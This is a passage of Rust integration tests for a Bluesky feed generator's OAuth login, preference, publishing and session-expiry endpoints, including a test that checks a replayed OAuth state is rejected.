                redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
                created_at_secs: now - 1000,
            },
        );
        state.oauth_store.insert(
            format!("fresh_state_{i}"),
            OAuthSessionState {
                code_verifier: format!("ver_fresh_{i}"),
                handle: format!("user_fresh_{i}.bsky.social"),
                did: Some(format!("did:plc:fresh_{i}")),
                pds_url: "https://bsky.social".to_string(),
                token_endpoint: "https://bsky.social/oauth/token".to_string(),
                redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
                created_at_secs: now,
            },
        );
    }

    // Trigger prune
    state.oauth_store.prune_expired(600, now);

    // Fresh states must be exchangeable
    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "fresh_code".to_string(),
                state: "fresh_state_0".to_string(),
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
}

// ===========================================================================
// TIER 4: REAL-WORLD APPLICATION SCENARIOS
// ===========================================================================

#[tokio::test]
async fn test_t4_s1_first_time_user_journey() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    // Step 1: Discover OAuth client metadata
    let req_meta = Request::builder()
        .uri("/oauth/client-metadata.json")
        .body(Body::empty())
        .unwrap();
    let resp_meta = app.clone().oneshot(req_meta).await.unwrap();
    assert_eq!(resp_meta.status(), StatusCode::OK);

    // Step 2: User enters handle "alice.bsky.social" in SPA modal -> initiates login
    let req_login = Request::builder()
        .uri("/api/oauth/login?handle=alice.bsky.social")
        .body(Body::empty())
        .unwrap();
    let resp_login = app.clone().oneshot(req_login).await.unwrap();
    assert_eq!(resp_login.status(), StatusCode::OK);
    let body_login = resp_login.into_body().collect().await.unwrap().to_bytes();
    let login_res: OAuthLoginResponse = serde_json::from_slice(&body_login).unwrap();

    // Step 3: Browser redirected to PDS, user approves, PDS redirects to /oauth/callback
    let req_cb = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "auth_code_from_pds".to_string(),
                state: login_res.state,
                iss: Some("https://bsky.social".to_string()),
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_cb = app.clone().oneshot(req_cb).await.unwrap();
    assert_eq!(resp_cb.status(), StatusCode::OK);
    let body_cb = resp_cb.into_body().collect().await.unwrap().to_bytes();
    let cb_res: OAuthCallbackResponse = serde_json::from_slice(&body_cb).unwrap();
    assert_eq!(cb_res.handle, "alice.bsky.social");

    // Step 4: User customizes dials in web dashboard -> saves to /api/preferences
    let req_pref = Request::builder()
        .method(Method::POST)
        .uri("/api/preferences")
        .header(AUTHORIZATION, format!("Bearer {}", cb_res.token))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(r#"{"freshness_hours":12.0,"discovery_ratio":0.40,"topic_weights":{"art":3.0,"tech":1.0,"science":2.0,"news":0.0,"culture":1.0}}"#))
        .unwrap();
    let resp_pref = app.clone().oneshot(req_pref).await.unwrap();
    assert_eq!(resp_pref.status(), StatusCode::OK);

    // Step 5: User clicks 1-click "Publish Feed to My Bluesky Profile" modal
    let req_pub = Request::builder()
        .method(Method::POST)
        .uri("/api/feed/publish")
        .header(AUTHORIZATION, format!("Bearer {}", cb_res.token))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&FeedPublishRequest {
                display_name: "For Your Consideration".to_string(),
                rkey: "for-your-consideration".to_string(),
                description: "My personalized FYC feed".to_string(),
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_pub = app.oneshot(req_pub).await.unwrap();
    assert_eq!(resp_pub.status(), StatusCode::OK);
    let body_pub = resp_pub.into_body().collect().await.unwrap().to_bytes();
    let pub_res: FeedPublishResponse = serde_json::from_slice(&body_pub).unwrap();
    assert_eq!(pub_res.status, "ok");
    assert!(pub_res.share_url.contains("for-your-consideration"));
}

#[tokio::test]
async fn test_t4_s2_returning_user_session_workflow() {
    let state = create_test_state();
    let app = create_xrpc_router(state);
    let user_did = "did:plc:returning_user_123";
    let token = generate_session_token(user_did, 86400);

    // Read existing preferences
    let req_read = Request::builder()
        .method(Method::GET)
        .uri("/api/preferences")
        .header(AUTHORIZATION, format!("Bearer {token}"))
        .body(Body::empty())
        .unwrap();
    let resp_read = app.clone().oneshot(req_read).await.unwrap();
    assert_eq!(resp_read.status(), StatusCode::OK);

    // Update dials
    let req_update = Request::builder()
        .method(Method::POST)
        .uri("/api/preferences")
        .header(AUTHORIZATION, format!("Bearer {token}"))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(r#"{"freshness_hours":72.0,"discovery_ratio":0.25,"topic_weights":{"art":1.0,"tech":4.0,"science":1.0,"news":1.0,"culture":1.0}}"#))
        .unwrap();
    let resp_update = app.clone().oneshot(req_update).await.unwrap();
    assert_eq!(resp_update.status(), StatusCode::OK);

    // Query getFeedSkeleton with token
    let req_feed = Request::builder()
        .uri("/xrpc/app.bsky.feed.getFeedSkeleton?feed=at://did:web:feed.example.com/app.bsky.feed.generator/for-your-consideration")
        .header(AUTHORIZATION, format!("Bearer {token}"))
        .body(Body::empty())
        .unwrap();
    let resp_feed = app.oneshot(req_feed).await.unwrap();
    assert_eq!(resp_feed.status(), StatusCode::OK);
}

#[tokio::test]
async fn test_t4_s3_malicious_replay_and_state_hijack_prevention() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    // Legitimate user starts login
    let req_login = Request::builder()
        .uri("/api/oauth/login?handle=target_user.bsky.social")
        .body(Body::empty())
        .unwrap();
    let resp_login = app.clone().oneshot(req_login).await.unwrap();
    let body_login = resp_login.into_body().collect().await.unwrap().to_bytes();
    let login_res: OAuthLoginResponse = serde_json::from_slice(&body_login).unwrap();

    // User completes callback
    let req_legit = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "legit_pds_code".to_string(),
                state: login_res.state.clone(),
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_legit = app.clone().oneshot(req_legit).await.unwrap();
    assert_eq!(resp_legit.status(), StatusCode::OK);

    // Man-in-the-middle attempts replay with forged code
    let req_mitm = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "forged_code".to_string(),
                state: login_res.state,
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_mitm = app.oneshot(req_mitm).await.unwrap();
    assert_eq!(
        resp_mitm.status(),
        StatusCode::BAD_REQUEST,
        "Replay of consumed state must be blocked"
    );
}

#[tokio::test]
async fn test_t4_s4_session_expiry_reauth_recovery() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    // Expired session token
    let expired_token = generate_session_token("did:plc:alice", -50);

    // Attempted publish fails with 401
    let req_fail = Request::builder()
        .method(Method::POST)
        .uri("/api/feed/publish")
        .header(AUTHORIZATION, format!("Bearer {expired_token}"))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            r#"{"display_name":"Feed","rkey":"feed","description":"desc"}"#,
        ))
        .unwrap();
    let resp_fail = app.clone().oneshot(req_fail).await.unwrap();
    assert_eq!(resp_fail.status(), StatusCode::UNAUTHORIZED);

    // User performs re-authentication via login + callback
    let req_login = Request::builder()
        .uri("/api/oauth/login?handle=alice.bsky.social")
        .body(Body::empty())
        .unwrap();
    let resp_login = app.clone().oneshot(req_login).await.unwrap();
    let body_login = resp_login.into_body().collect().await.unwrap().to_bytes();
    let login_res: OAuthLoginResponse = serde_json::from_slice(&body_login).unwrap();

    let req_cb = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "new_auth_code".to_string(),
                state: login_res.state,
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_cb = app.clone().oneshot(req_cb).await.unwrap();
    let body_cb = resp_cb.into_body().collect().await.unwrap().to_bytes();
    let cb_res: OAuthCallbackResponse = serde_json::from_slice(&body_cb).unwrap();

    // User retries publish with new token -> succeeds
    let req_retry = Request::builder()
        .method(Method::POST)
        .uri("/api/feed/publish")
        .header(AUTHORIZATION, format!("Bearer {}", cb_res.token))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&FeedPublishRequest {
                display_name: "Fresh Feed".to_string(),
                rkey: "fresh-feed".to_string(),
                description: "Published after reauth".to_string(),
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_retry = app.oneshot(req_retry).await.unwrap();
    assert_eq!(resp_retry.status(), StatusCode::OK);
}

#[tokio::test]
async fn test_t4_s5_high_concurrency_50_users_oauth_pipeline() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let success_count = Arc::new(AtomicUsize::new(0));
    let mut tasks = Vec::new();

    for user_idx in 0..50 {
        let app_clone = app.clone();
        let succ = Arc::clone(&success_count);

        tasks.push(tokio::spawn(async move {
            let handle = format!("user_{user_idx}.bsky.social");

            // 1. Login initiation
            let req_login = Request::builder()
                .uri(format!("/api/oauth/login?handle={handle}"))
                .body(Body::empty())
                .unwrap();
            let resp_login = app_clone.clone().oneshot(req_login).await.unwrap();
            if resp_login.status() != StatusCode::OK {
                return;
            }
            let body_login = resp_login.into_body().collect().await.unwrap().to_bytes();
            let login_res: OAuthLoginResponse = serde_json::from_slice(&body_login).unwrap();

            // 2. Token exchange callback
            let req_cb = Request::builder()
                .method(Method::POST)
                .uri("/api/oauth/callback")
                .header(CONTENT_TYPE, "application/json")
                .body(Body::from(
                    serde_json::to_vec(&OAuthCallbackRequest {
                        code: format!("code_{user_idx}"),
                        state: login_res.state,
                        iss: None,
                    })
                    .unwrap(),
                ))
                .unwrap();
            let resp_cb = app_clone.clone().oneshot(req_cb).await.unwrap();
            if resp_cb.status() != StatusCode::OK {
                return;
            }
            let body_cb = resp_cb.into_body().collect().await.unwrap().to_bytes();
            let cb_res: OAuthCallbackResponse = serde_json::from_slice(&body_cb).unwrap();

            // 3. Authenticated preference save
            let req_save = Request::builder()
                .method(Method::POST)
                .uri("/api/preferences")
                .header(AUTHORIZATION, format!("Bearer {}", cb_res.token))
                .header(CONTENT_TYPE, "application/json")
                .body(Body::from(r#"{"freshness_hours":24.0,"discovery_ratio":0.15,"topic_weights":{"art":1.0,"tech":1.0,"science":1.0,"news":1.0,"culture":1.0}}"#))
                .unwrap();
            let resp_save = app_clone.oneshot(req_save).await.unwrap();
            if resp_save.status() == StatusCode::OK {
                succ.fetch_add(1, Ordering::Relaxed);
            }
        }));
    }

    for t in tasks {
        t.await.unwrap();
    }

    assert_eq!(
        success_count.load(Ordering::Relaxed),
        50,
        "All 50 concurrent user OAuth flows must complete with 100% success"
    );
}

#[tokio::test]
async fn test_t4_s6_self_hosted_pds_custom_domain_integration() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let custom_pds_handle = "alice.custom-domain.org";

    let req_login = Request::builder()
        .uri(format!("/api/oauth/login?handle={custom_pds_handle}"))
        .body(Body::empty())
        .unwrap();
    let resp_login = app.clone().oneshot(req_login).await.unwrap();
    assert_eq!(resp_login.status(), StatusCode::OK);
    let body_login = resp_login.into_body().collect().await.unwrap().to_bytes();
    let login_res: OAuthLoginResponse = serde_json::from_slice(&body_login).unwrap();

    let req_cb = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "custom_pds_auth_code".to_string(),
                state: login_res.state,
                iss: Some("https://alice.custom-domain.org".to_string()),
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_cb = app.clone().oneshot(req_cb).await.unwrap();
    assert_eq!(resp_cb.status(), StatusCode::OK);
    let body_cb = resp_cb.into_body().collect().await.unwrap().to_bytes();
    let cb_res: OAuthCallbackResponse = serde_json::from_slice(&body_cb).unwrap();
    assert_eq!(cb_res.handle, custom_pds_handle);

    // Publish feed
    let req_pub = Request::builder()
        .method(Method::POST)
        .uri("/api/feed/publish")
        .header(AUTHORIZATION, format!("Bearer {}", cb_res.token))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&FeedPublishRequest {
                display_name: "Self-Hosted Custom Feed".to_string(),
                rkey: "self-hosted-feed".to_string(),
                description: "Published from self-hosted domain".to_string(),
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_pub = app.oneshot(req_pub).await.unwrap();
    assert_eq!(resp_pub.status(), StatusCode::OK);
}
